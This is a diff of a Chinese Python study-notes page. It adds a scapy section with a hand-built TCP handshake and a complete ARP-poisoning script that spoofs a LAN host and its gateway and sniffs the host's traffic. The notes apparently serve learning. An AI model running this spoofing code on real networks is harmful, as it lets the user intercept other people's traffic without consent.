@@ -35,7 +35,7 @@
   <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
     <link rel="index" title="Index" href="genindex.html" />
     <link rel="search" title="Search" href="search.html" />
-    <link rel="next" title="spark" href="spark.html" />
+    <link rel="next" title="Spark" href="spark.html" />
     <link rel="prev" title="Linux" href="Linux.html" /> 
 </head>
 
@@ -87,10 +87,13 @@
 <li class="toctree-l1"><a class="reference internal" href="Linux.html">Linux</a></li>
 <li class="toctree-l1 current"><a class="current reference internal" href="#">Python</a><ul>
 <li class="toctree-l2"><a class="reference internal" href="#id1">词云</a></li>
-<li class="toctree-l2"><a class="reference internal" href="#requests">requests库的应用</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#requests">requests库的使用</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#scapy">scapy库的使用</a></li>
 </ul>
 </li>
-<li class="toctree-l1"><a class="reference internal" href="spark.html">spark</a></li>
+<li class="toctree-l1"><a class="reference internal" href="spark.html">Spark</a></li>
+<li class="toctree-l1"><a class="reference internal" href="code.html">加密&amp;解密</a></li>
+<li class="toctree-l1"><a class="reference internal" href="go.html">golang(够浪)</a></li>
 <li class="toctree-l1"><a class="reference internal" href="support.html">Support</a></li>
 </ul>
 
@@ -188,7 +191,7 @@
 </div>
 </div>
 <div class="section" id="requests">
-<h2>requests库的应用<a class="headerlink" href="#requests" title="Permalink to this headline">¶</a></h2>
+<h2>requests库的使用<a class="headerlink" href="#requests" title="Permalink to this headline">¶</a></h2>
 <p>发送http请求:</p>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://www.baidu.com&#39;</span>
 <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;user-agent&#39;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">}</span>
@@ -198,6 +201,94 @@
 <span class="c1"># response.text 是requests 解码后的数据，解码方式是推测的，可能出错</span>
 
 <span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="p">)</span> <span class="c1"># post 请求</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="scapy">
+<h2>scapy库的使用<a class="headerlink" href="#scapy" title="Permalink to this headline">¶</a></h2>
+<p>模拟三次握手:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>windows查看端口 netstat
+
+send(),在第三层发送数据包，但没有接收功能
+sendp(),在第二层发送数据包，同样没有接收功能
+
+sr(),在第三层发送数据包，有接收功能
+sr1(),在第三层发送数据包，有接收功能，但只接收第一个包
+srloop(),在第三层工作,循环发包
+
+srp()、srp1()、srploop()与sr,sr1,srloop类似,只是工作在第二层
+开始模拟时需要设置防火墙规则，防止操作系统发送RST
+iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.233.1 -j DROP
+
+flags = 2 为SYN扫描，半开式扫描
+recv=sr1(IP(dst=&quot;192.168.233.1&quot;)/TCP(dport=10020,sport=7777,flags=&quot;S&quot;))
+ack = recv.ack
+seq = recv.seq
+
+发送ACK(flag = 16),完成三次握手！
+send(IP(dst=&#39;192.168.233.1&#39;)/TCP(dport=10020,sport=7777,flags=16,seq=ack,ack=seq+1))
+
+flag为24（ACK = 16，PUSH = 8) 发送数据
+recv1 = sr(IP(dst=&#39;192.168.233.1&#39;)/TCP(dport=10020,sport=7777,flags=24,seq=ack,ack=seq+1)/&quot;hi&quot;, multi=1, timeout=10)
+如果多次发送数据需要每次对获取的seq+1,然后令ack等于seq+1
+
+flags=17, FIN（1） + ACK（16），进行连接终结
+recv1=srp1(IP(dst=&#39;192.168.233.1&#39;)/TCP(dport=10020,sport=7777,seq=ack,ack=seq+1,flags=17))
+</pre></div>
+</div>
+<p>arp投毒,抓包:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="k">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">signal</span>
+<span class="kn">from</span> <span class="nn">scapy.layers.l2</span> <span class="k">import</span> <span class="n">ARP</span><span class="p">,</span> <span class="n">Ether</span>
+
+<span class="k">def</span> <span class="nf">restore_target</span><span class="p">(</span><span class="n">gateway_ip</span><span class="p">,</span><span class="n">gateway_mac</span><span class="p">,</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_mac</span><span class="p">):</span>
+   <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;restore target &gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;</span><span class="p">)</span>
+   <span class="n">send</span><span class="p">(</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span><span class="n">psrc</span><span class="o">=</span><span class="n">gateway_ip</span><span class="p">,</span><span class="n">pdst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span><span class="n">hwdst</span><span class="o">=</span><span class="s2">&quot;ff:ff:ff:ff:ff:ff&quot;</span><span class="p">,</span><span class="n">hwsrc</span><span class="o">=</span><span class="n">gateway_mac</span><span class="p">),</span><span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+   <span class="n">send</span><span class="p">(</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span><span class="n">psrc</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span><span class="n">pdst</span><span class="o">=</span><span class="n">gateway_ip</span><span class="p">,</span><span class="n">hwdst</span><span class="o">=</span><span class="s2">&quot;ff:ff:ff:ff:ff:ff&quot;</span><span class="p">,</span><span class="n">hwsrc</span><span class="o">=</span><span class="n">target_mac</span><span class="p">),</span><span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+   <span class="n">os</span><span class="o">.</span><span class="n">kill</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getpid</span><span class="p">(),</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">get_mac</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
+   <span class="n">responses</span><span class="p">,</span><span class="n">unanswered</span> <span class="o">=</span> <span class="n">srp</span><span class="p">(</span><span class="n">Ether</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&quot;ff:ff:ff:ff:ff:ff&quot;</span><span class="p">)</span><span class="o">/</span><span class="n">ARP</span><span class="p">(</span><span class="n">pdst</span><span class="o">=</span><span class="n">ip_address</span><span class="p">),</span>
+                              <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span><span class="n">retry</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+   <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span>
+   <span class="k">for</span> <span class="n">s</span><span class="p">,</span><span class="n">r</span> <span class="ow">in</span> <span class="n">responses</span><span class="p">:</span>
+       <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+       <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;$&quot;</span><span class="o">*</span><span class="mi">20</span><span class="p">)</span>
+       <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+       <span class="k">return</span> <span class="n">r</span><span class="p">[</span><span class="n">Ether</span><span class="p">]</span><span class="o">.</span><span class="n">src</span>
+<span class="k">def</span> <span class="nf">poison_target</span><span class="p">(</span><span class="n">gateway_ip</span><span class="p">,</span><span class="n">gateway_mac</span><span class="p">,</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_mac</span><span class="p">):</span>
+   <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;begin to ARP poison&quot;</span><span class="p">)</span>
+   <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+       <span class="k">try</span><span class="p">:</span>
+           <span class="n">send</span><span class="p">(</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span><span class="n">psrc</span><span class="o">=</span><span class="n">gateway_ip</span><span class="p">,</span><span class="n">pdst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span><span class="n">hwdst</span><span class="o">=</span><span class="n">target_mac</span><span class="p">))</span> <span class="c1"># 欺骗主机</span>
+           <span class="n">send</span><span class="p">(</span><span class="n">ARP</span><span class="p">(</span><span class="n">op</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span><span class="n">psrc</span><span class="o">=</span><span class="n">target_ip</span><span class="p">,</span><span class="n">pdst</span><span class="o">=</span><span class="n">gateway_ip</span><span class="p">,</span><span class="n">hwdst</span><span class="o">=</span><span class="n">gateway_mac</span><span class="p">))</span> <span class="c1"># 欺骗网关</span>
+       <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+           <span class="n">restore_target</span><span class="p">(</span><span class="n">gateway_ip</span><span class="p">,</span><span class="n">gateway_mac</span><span class="p">,</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_mac</span><span class="p">)</span>
+
+   <span class="c1"># print(&quot;stoped poison&quot;)</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+
+   <span class="n">target_ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.150&#39;</span>
+   <span class="n">gateway_ip</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.1&#39;</span>
+   <span class="n">packet_count</span> <span class="o">=</span> <span class="mi">10</span>
+   <span class="n">conf</span><span class="o">.</span><span class="n">verb</span> <span class="o">=</span> <span class="mi">0</span>
+   <span class="n">gateway_mac</span> <span class="o">=</span> <span class="n">get_mac</span><span class="p">(</span><span class="n">gateway_ip</span><span class="p">)</span>
+   <span class="n">target_mac</span> <span class="o">=</span> <span class="n">get_mac</span><span class="p">(</span><span class="n">target_ip</span><span class="p">)</span>
+   <span class="nb">print</span><span class="p">(</span><span class="n">gateway_mac</span><span class="p">,</span><span class="n">target_mac</span><span class="p">)</span>
+   <span class="n">poison_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">poison_target</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">gateway_ip</span><span class="p">,</span><span class="n">gateway_mac</span><span class="p">,</span>
+                                                               <span class="n">target_ip</span><span class="p">,</span><span class="n">target_mac</span><span class="p">))</span>
+   <span class="n">poison_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+   <span class="k">try</span><span class="p">:</span>
+       <span class="n">bpf_filter</span> <span class="o">=</span> <span class="s2">&quot;ip host </span><span class="si">%s</span><span class="s2">&quot;</span><span class="o">%</span><span class="n">target_ip</span>
+       <span class="n">packets_</span> <span class="o">=</span> <span class="n">sniff</span><span class="p">(</span><span class="n">count</span><span class="o">=</span><span class="n">packet_count</span><span class="p">,</span><span class="nb">filter</span><span class="o">=</span><span class="n">bpf_filter</span><span class="p">)</span> <span class="c1"># 抓包</span>
+       <span class="n">wrpcap</span><span class="p">(</span><span class="s2">&quot;arp.pcap&quot;</span><span class="p">,</span><span class="n">packets_</span><span class="p">)</span>
+       <span class="n">restore_target</span><span class="p">(</span><span class="n">gateway_ip</span><span class="p">,</span><span class="n">gateway_mac</span><span class="p">,</span><span class="n">target_ip</span><span class="p">,</span><span class="n">target_mac</span><span class="p">)</span> <span class="c1"># 恢复原先设置</span>
+   <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+       <span class="n">restore_target</span><span class="p">(</span><span class="n">gateway_ip</span><span class="p">,</span> <span class="n">gateway_mac</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">target_mac</span><span class="p">)</span> <span class="c1"># 恢复原先设置</span>
+
+   <span class="n">poison_thread</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
 </pre></div>
 </div>
 </div>
@@ -211,7 +302,7 @@
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="spark.html" class="btn btn-neutral float-right" title="spark" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+        <a href="spark.html" class="btn btn-neutral float-right" title="Spark" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
       
       
         <a href="Linux.html" class="btn btn-neutral float-left" title="Linux" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
